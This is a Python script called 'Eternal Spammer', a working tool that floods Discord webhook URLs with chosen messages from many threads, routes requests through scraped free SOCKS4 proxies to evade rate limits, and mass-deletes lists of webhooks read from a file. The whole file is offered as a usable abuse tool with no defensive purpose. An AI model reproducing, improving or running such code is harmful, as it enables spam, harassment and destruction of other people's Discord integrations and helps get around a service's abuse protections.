# Created By Eternal Atake
import os
import ctypes
import requests
import time
import random
import json
import threading
from colorama import Fore, init

init(autoreset=True)
if os.name == "nt":
	os.system("mode con: cols=138 lines=30")

locker = threading.Lock()
proxies_list = []

def title(text):
	if os.name == "nt":
		ctypes.windll.kernel32.SetConsoleTitleW(f"Eternal Spammer | Created By Eternal Atake")
	else:
		print(f"\33]0;Eternal Spammer", end="", flush=True)

def logo():
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")

	print(f"""{Fore.BLUE}\u001b[1m
                                 ╔═╗╔╦╗╔═╗╦═╗╔╗╔╔═╗╦    ╔═╗╔═╗╔═╗╔╦╗╔╦╗╔═╗╦═╗
                                 ║╣  ║ ║╣ ╠╦╝║║║╠═╣║    ╚═╗╠═╝╠═╣║║║║║║║╣ ╠╦╝
                                 ╚═╝ ╩ ╚═╝╩╚═╝╚╝╩ ╩╩═╝  ╚═╝╩  ╩ ╩╩ ╩╩ ╩╚═╝╩╚═ 
                                     {Fore.LIGHTYELLOW_EX}Rapid Webhook Spammer {Fore.WHITE}[{Fore.LIGHTYELLOW_EX}Version \u001b[32m2{Fore.WHITE}.\u001b[32m0{Fore.WHITE}]

	""")
# ProxyScraper Configuration
def proxies_scraper():
	global proxies_list

	while True:
		response = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all&simplified=true")
		proxies_list = response.text.splitlines()
		
		time.sleep(3)

def proxies_random():
	proxy = random.choice(proxies_list)

	proxies = {
		"http": f"socks4://{proxy}",
		"https": f"socks4://{proxy}"
	}
	
	return proxies

def spammer(use_proxies, url, username, avatar_url, message):
	while True:
		try:
			if use_proxies == "y":
				proxy = proxies_random()
			else:
				proxy = {
					"http": None,
					"https": None
				}
			
			response = requests.post(url, json={"username": username, "avatar_url": avatar_url, "content": message}, proxies=proxy)
			if response.status_code != 204:
				if response.status_code == 404:
					locker.acquire()
					print(f"{Fore.WHITE}\u001b[1m[{Fore.LIGHTRED_EX}Invalid Webhook{Fore.WHITE}]\u001b[1m {Fore.LIGHTYELLOW_EX}{url.split('webhooks/')[1]}")
					locker.release()
					break
				elif response.status_code == 429:
					time.sleep(float(json.loads(response.content)['retry_after'] / 1000))
				else:
					locker.acquire()
					print(f"{Fore.WHITE}\u001b[1m[{Fore.LIGHTRED_EX}Unknown Error {Fore.WHITE}- \u001b[1m{Fore.LIGHTYELLOW_EX}{response.status_code}{Fore.WHITE}] {Fore.LIGHTYELLOW_EX}{url.split('webhooks/')[1]}")
					locker.release()
			else:
				locker.acquire()
				print(f"\u001b[1m\u001b[37m[\u001b[32mSuccess\u001b[1m\u001b[37m] {Fore.LIGHTYELLOW_EX}{url.split('webhooks/')[1]}")
				locker.release()
		except:
			pass
# Success & Error Logs
def deleter(use_proxies, url):
	global success, errors

	request_sent = False
	while not request_sent:
		try:
			if use_proxies == "y":
				proxy = proxies_random()
			else:
				proxy = {
					"http": None,
					"https": None
				}

			response = requests.delete(url, proxies=proxy, timeout=5)
			request_sent = True
			if response.status_code != 204:
				errors += 1
				if response.status_code == 404:
					locker.acquire()
					print(f"{Fore.WHITE}\u001b[1m[{Fore.LIGHTRED_EX}Invalid Webhook{Fore.WHITE}] \u001b[1m{Fore.LIGHTYELLOW_EX}{url.split('webhooks/')[1]}")
					locker.release()
			else:
				success += 1
				locker.acquire()
				print(f"{Fore.WHITE}\u001b[1m[{Fore.LIGHTGREEN_EX}Success{Fore.WHITE}] \u001b[1m{Fore.LIGHTYELLOW_EX}{url.split('webhooks/')[1]}")
				locker.release()

			if success + errors == total_url:
				title("Deleting - Finished")

				logo()
				print(f"{Fore.LIGHTGREEN_EX}\u001b[1m{success} Webhooks Successfully Deleted.")
				print(f"{Fore.LIGHTRED_EX}\u001b[1m{errors} Webhooks Encountered Errors During Deletion Process.")

				time.sleep(5)
				init()
		except:
			pass
# Options & Variables
def init():
	global total_url, success, errors

	title("Initialization")

	logo()
	print(f"{Fore.LIGHTGREEN_EX}Flood Webhook? \u001b[1m\u001b[37m(\u001b[32my\u001b[37m/\u001b[31mn\u001b[37m)")
	spam_webhooks = input("\n~# ").lower()

	logo()
	print(f"{Fore.LIGHTGREEN_EX}Remove & Destroy Multiple Webhooks? \u001b[1m\u001b[37m(\u001b[32my\u001b[37m/\u001b[31mn\u001b[37m)")
	multiple_webhooks = input("\n~# ").lower()
	if multiple_webhooks == "n":
		logo()
		print(f"{Fore.LIGHTGREEN_EX}Enter The Webhook URL.")
		url = input("\n~# ")
	else:
		logo()
		print(f"{Fore.LIGHTGREEN_EX}\u001b[1mEnter file name that contains webhooks. \u001b[1m{Fore.WHITE}({Fore.LIGHTYELLOW_EX}with .txt{Fore.WHITE})")
		webhooks_file = input("\n~# ")

	if spam_webhooks == "y":
		logo()
		print(f"{Fore.LIGHTGREEN_EX}Enter A Username For The Webhook")
		username = input("\n~# ")

		logo()
		print(f"{Fore.LIGHTGREEN_EX}Enter Image URL For Webhook's Avatar. {Fore.WHITE}({Fore.LIGHTRED_EX}Empty For No Avatar{Fore.WHITE})")
		avatar_url = input("\n~# ")

		logo()
		print(f"{Fore.LIGHTGREEN_EX}Enter The Message You Want To Spam.")
		message = input("\n~# ")

		logo()
		print(f"{Fore.LIGHTGREEN_EX}Enter An Amount Of Threads.")
		try:
			threads_count = int(input("\n~# "))
		except:
			logo()
			print(f"\u001b[1m{Fore.WHITE}[{Fore.LIGHTRED_EX}Error{Fore.WHITE}] {Fore.LIGHTRED_EX}Invalid threads count.")
			time.sleep(5)
			init()

	logo()
	print(f"{Fore.LIGHTGREEN_EX}Use Proxies? \u001b[1m\u001b[37m(\u001b[32my\u001b[37m/\u001b[31mn\u001b[37m)")
	use_proxies = input("\n~# ").lower()

	if spam_webhooks == "y":
		title("Spamming")

		logo()
		if use_proxies == "y":
			threading.Thread(target=proxies_scraper).start()
			while len(proxies_list) == 0: 
				time.sleep(0.5)

		if multiple_webhooks == "n":
			for i in range(0, threads_count):
				threading.Thread(target=spammer, args=(use_proxies, url, username, avatar_url, message)).start()
		else:
			with open(webhooks_file) as file:
				for line in file:
					for i in range(0, threads_count):
						threading.Thread(target=spammer, args=(use_proxies, line.rstrip(), username, avatar_url, message)).start()

				file.close()
	else:
		title("Deleting")

		logo()

		if use_proxies == "y":
			threading.Thread(target=proxies_scraper).start()
			while len(proxies_list) == 0: 
				time.sleep(0.5)

		success = 0
		errors = 0
		if multiple_webhooks == "n":
			total_url = 1
			threading.Thread(target=deleter, args=(use_proxies, url,)).start()
		else:
			total_url = len(open(webhooks_file).readlines())
			with open(webhooks_file) as file:
				for line in file:
					threading.Thread(target=deleter, args=(use_proxies, line.rstrip(),)).start()

				file.close()

if __name__ == "__main__":
	try:
		init()
	except KeyboardInterrupt:
		exit()
